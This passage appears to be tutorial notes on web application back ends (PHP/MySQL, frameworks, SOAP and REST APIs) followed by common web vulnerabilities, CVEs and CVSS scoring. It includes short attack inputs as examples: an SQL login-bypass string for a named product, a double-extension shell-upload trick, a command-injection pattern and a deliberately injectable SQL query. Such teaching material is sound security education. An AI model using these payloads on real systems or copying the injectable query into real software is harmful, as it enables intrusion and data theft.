$conn = new mysqli("localhost", "user", "pass");

```

Then, we can create a new database with:

Code: php

```php
$sql = "CREATE DATABASE database1";
$conn->query($sql)
```

After that, we can connect to our new database, and start using the `MySQL` database through `MySQL` syntax, right within `PHP`, as follows:

Code: php

```php
$conn = new mysqli("localhost", "user", "pass", "database1");
$query = "select * from table_1";
$result = $conn->query($query);
```



## Development Frameworks & APIs

As most web applications share common functionality -such as user registration-, web development frameworks make it easy to quickly implement this functionality and link them to the front end components, making a fully functional web application. Some of the most common web development frameworks include:

* [Laravel](https://laravel.com/) (`PHP`): usually used by startups and smaller companies, as it is powerful yet easy to develop for.
* [Express](https://expressjs.com/) (`Node.JS`): used by `PayPal`, `Yahoo`, `Uber`, `IBM`, and `MySpace`.
* [Django](https://www.djangoproject.com/) (`Python`): used by `Google`, `YouTube`, `Instagram`, `Mozilla`, and `Pinterest`.
* [Rails](https://rubyonrails.org/) (`Ruby`): used by `GitHub`, `Hulu`, `Twitch`, `Airbnb`, and even `Twitter` in the past.



### APIs

An important aspect of back end web application development is the use of Web [APIs](https://en.wikipedia.org/wiki/API) and HTTP Request parameters to connect the front end and the back end to be able to send data back and forth between front end and back end components and carry out various functions within the web application.

For the front end component to interact with the back end and ask for certain tasks to be carried out, they utilize APIs to ask the back end component for a specific task with specific input. The back end components process these requests, perform the necessary functions, and return a certain response to the front end components, which finally renderers the end user's output on the client-side.



**Query Parameters**

**Query Parameters**

The default method of sending specific arguments to a web page is through `GET` and `POST` request parameters. This allows the front end components to specify values for certain parameters used within the page for the back end components to process them and respond accordingly.

For example, a `/search.php` page would take an `item` parameter, which may be used to specify the search item. Passing a parameter through a `GET` request is done through the URL '`/search.php?item=apples`', while `POST` parameters are passed through `POST` data at the bottom of the `POST` `HTTP` request:

Code: http

```http
POST /search.php HTTP/1.1
...SNIP...

item=apples
```

Query parameters allow a single page to receive various types of input, each of which can be processed differently. For certain other scenarios, Web APIs may be much quicker and more efficient to use. The [Web Requests module](https://academy.hackthebox.com/course/preview/web-requests) takes a deeper dive into `HTTP` requests.



### Web APIs

An API ([Application Programming Interface](https://en.wikipedia.org/wiki/API)) is an interface within an application that specifies how the application can interact with other applications. For Web Applications, it is what allows remote access to functionality on back end components. APIs are not exclusive to web applications and are used for software applications in general. Web APIs are usually accessed over the `HTTP` protocol and are usually handled and translated through web servers.

<figure><img src="../../.gitbook/assets/image (220).png" alt=""><figcaption></figcaption></figure>

To enable the use of APIs within a web application, the developers have to develop this functionality on the back end of the web application by using the API standards like `SOAP` or `REST`.



### SOAP

The `SOAP` ([Simple Objects Access](https://en.wikipedia.org/wiki/SOAP)) standard shares data through `XML`, where the request is made in `XML` through an HTTP request, and the response is also returned in `XML`. Front end components are designed to parse this `XML` output properly. The following is an example `SOAP` message:

```xml
<?xml version="1.0"?>

<soap:Envelope
xmlns:soap="http://www.example.com/soap/soap/"
soap:encodingStyle="http://www.w3.org/soap/soap-encoding">

<soap:Header>
</soap:Header>

<soap:Body>
  <soap:Fault>
  </soap:Fault>
</soap:Body>

</soap:Envelope>
```

`SOAP` is very useful for transferring structured data (i.e., an entire class object), or even binary data, and is often used with serialized objects, all of which enables sharing complex data between front end and back end components and parsing it properly. It is also very useful for sharing _stateful_ objects -i.e., sharing/changing the current state of a web page-, which is becoming more common with modern web applications and mobile applications.



### REST

The `REST` ([Representational State Transfer](https://en.wikipedia.org/wiki/Representational\_state\_transfer)) standard shares data through the URL path 'i.e. `search/users/1`', and usually returns the output in `JSON` format 'i.e. userid `1`'.

Unlike Query Parameters, `REST` APIs usually focus on pages that expect one type of input passed directly through the URL path, without specifying its name or type. This is usually useful for queries like `search`, `sort`, or `filter`. This is why `REST` APIs usually break web application functionality into smaller APIs and utilize these smaller API requests to allow the web application to perform more advanced actions, making the web application more modular and scalable.

As seen previously in the `database` section, the following is an example of a `JSON` response to the `GET /category/posts/` API request:

Code: json

```json
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  },
  "100003": {
    "date": "02-01-2021",
    "content": "Reminder: Tomorrow is the ..."
  }
}
```

`REST` uses various HTTP methods to perform different actions on the web application:

* `GET` request to retrieve data
* `POST` request to create data (non-idempotent)
* `PUT` request to create or replace existing data (idempotent)
* `DELETE` request to remove data



## Common Web Vulnerabilities

### Broken Authentication/Access Control

`Broken authentication` and `Broken Access Control` are among the most common and most dangerous vulnerabilities for web applications.

`Broken Authentication` refers to vulnerabilities that allow attackers to bypass authentication functions. For example, this may allow an attacker to login without having a valid set of credentials or allow a normal user to become an administrator without having the privileges to do so.

`Broken Access Control` refers to vulnerabilities that allow attackers to access pages and features they should not have access to. For example, a normal user gaining access to the admin panel.

For example, `College Management System 1.2` has a simple [Auth Bypass](https://www.exploit-db.com/exploits/47388) vulnerability that allows us to login without having an account, by inputting the following for the email field: `' or 0=0 #`, and using any password with it.



### Malicious File Upload

If the web application has a file upload feature and does not properly validate the uploaded files, we may upload a malicious script (i.e., a `PHP` script), which will allow us to execute commands on the remote server.

For example, the WordPress Plugin `Responsive Thumbnail Slider 1.0` can be exploited to upload any arbitrary file, including malicious scripts, by uploading a file with a double extension (i.e. `shell.php.jpg`). There's even a [Metasploit Module](https://www.rapid7.com/db/modules/exploit/multi/http/wp\_responsive\_thumbnail\_slider\_upload/) that allows us to exploit this vulnerability easily.



### Command Injection

Many web applications execute local Operating System commands to perform certain processes. For example, a web application may install a plugin of our choosing by executing an OS command that downloads that plugin, using the plugin name provided. If not properly filtered and sanitized, attackers may be able to inject another command to be executed alongside the originally intended command (i.e., as the plugin name), which allows them to directly execute commands on the back end server and gain control over it. This type of vulnerability is called [command injection](https://owasp.org/www-community/attacks/Command\_Injection).

For example, the WordPress Plugin `Plainview Activity Monitor 20161228` has a [vulnerability](https://www.exploit-db.com/exploits/45274) that allows attackers to inject their command in the `ip` value, by simply adding `| COMMAND...` after the `ip` value.



### SQL Injection (SQLi)

Similarly to a Command Injection vulnerability, this vulnerability may occur when the web application executes a SQL query, including a value taken from user-supplied input.

For example, in the `database` section, we saw an example of how a web application would use user-input to search within a certain table, with the following line of code:

Code: php

```php
$query = "select * from users where name like '%$searchInput%'";
```

If the user input is not properly filtered and validated (as is the case with `Command Injections`), we may execute another SQL query alongside this query, which may eventually allow us to take control over the database and its hosting server.



## Public Vulnerabilities

### Public CVE

As many organizations deploy web applications that are publicly used, like open-source and proprietary web applications, these web applications tend to be tested by many organizations and experts around the world. This leads to frequently uncovering a large number of vulnerabilities, most of which get patched and then shared publicly and assigned a CVE ([Common Vulnerabilities and Exposures](https://en.wikipedia.org/wiki/Common\_Vulnerabilities\_and\_Exposures)) record and score.

<mark style="color:red;">Tip:</mark> The first step is to identify the version of the web application. This can be found in many locations, like the source code of the web application. For open source web applications, we can check the repository of the web application and identify where the version number is shown (e.g,. in (version.php) page), and then check the same page on our target web application to confirm.

Once we identify the web application version, we can search Google for public exploits for this version of the web application. We can also utilize online exploit databases, like [Exploit DB](https://www.exploit-db.com/), [Rapid7 DB](https://www.rapid7.com/db/), or [Vulnerability Lab](https://www.vulnerability-lab.com/). The following example shows a search for WordPress public exploits in [Rapid7 DB](https://www.rapid7.com/db/):

### Common Vulnerability Scoring System (CVSS)

The [Common Vulnerability Scoring System (CVSS)](https://en.wikipedia.org/wiki/Common\_Vulnerability\_Scoring\_System) is an open-source industry standard for assessing the severity of security vulnerabilities.

&#x20;The [National Vulnerability Database (NVD)](https://nvd.nist.gov/) provides CVSS scores for almost all known, publicly disclosed vulnerabilities.

The current scoring systems in place are CVSS v2 and CVSS v3.More information about the differences between the two scoring systems can be found [here](https://www.balbix.com/insights/cvss-v2-vs-cvss-v3).

| CVSS V2.0 Ratings |                      |
| ----------------- | -------------------- |
| **Severity**      | **Base Score Range** |
| Low               | 0.0-3.9              |
| Medium            | 4.0-6.9              |
| High              | 7.0-10.0             |

| **CVSS V3.0 Ratings** |                      |
| --------------------- | -------------------- |
| **Severity**          | **Base Score Range** |
| None                  | 0.0                  |
| Low                   | 0.1-3.9              |
| Medium                | 4.0-6.9              |
| High                  | 7.0-8.9              |
| Critical              | 9.0-10.0             |

### Back-end Server Vulnerabilities

The most critical vulnerabilities for back-end components are found in web servers, as they are publicly accessible over the `TCP` protocol. An example of a well-known web server vulnerability is the `Shell-Shock`, which affected Apache web servers released during and before 2014 and utilized `HTTP` requests to gain remote control over the back-end server.















































